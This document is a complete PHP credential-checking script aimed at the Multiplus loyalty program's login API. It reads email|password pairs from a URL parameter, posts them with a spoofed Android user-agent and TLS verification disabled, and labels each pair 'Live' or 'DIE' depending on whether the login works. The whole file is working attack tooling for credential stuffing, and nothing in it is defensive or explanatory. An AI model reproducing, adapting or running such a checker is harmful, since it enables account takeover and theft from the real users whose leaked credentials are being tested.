<?php 
    function getStr($string, $start, $end) { 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
    } 
 
    set_time_limit(0); 
    error_reporting(0); 
 
    $linha = $_GET["linha"]; 
$email = explode("|", $linha)[0]; 
$senha = explode("|", $linha)[1]; 
    if (file_Exists('cookie.txt')) { 
        unlink('cookie.txt'); 
    } 
    if (!empty($senha)) { 
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, 'https://api1.pontosmultiplus.com.br/API/AutenticarUsuarioAPIRv1'); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); 
        curl_setopt($ch, CURLOPT_HEADER, 1); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY( 
    'Host: api1.pontosmultiplus.com.br ', 
    'Connection: Keep-Alive', 
    'user-agent: android-async-http/1.4.4 (http://loopj.com/android-async-http)', 
    'Content-Type: application/json', 
    'Cache-Control: no-cache' 
)); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "usuario": {
    "idUsuario": "'.$email.'",
    "senha": "'.$senha.'",
    "tipoUsuario": {
      "valorReferencia": "PARTICIPANTE"
    },
    "tipoCredencial": {
      "valorReferencia": "SENHA_ACESSO"
    }
  },
  "propriedadesExecucao": {
    "idInterface": "1"
  }
}'); 
        curl_setopt($ch, CURLOPT_POST, 1); 
        $resulta = curl_exec($ch); 


        if (strpos($resulta, '"usuario":')) { 
            echo "Live ➜ $email|$senha #FlashReverso"; 
        }else { 
            echo "DIE ➜  $email|$senha"; 
        } 
    } 
?>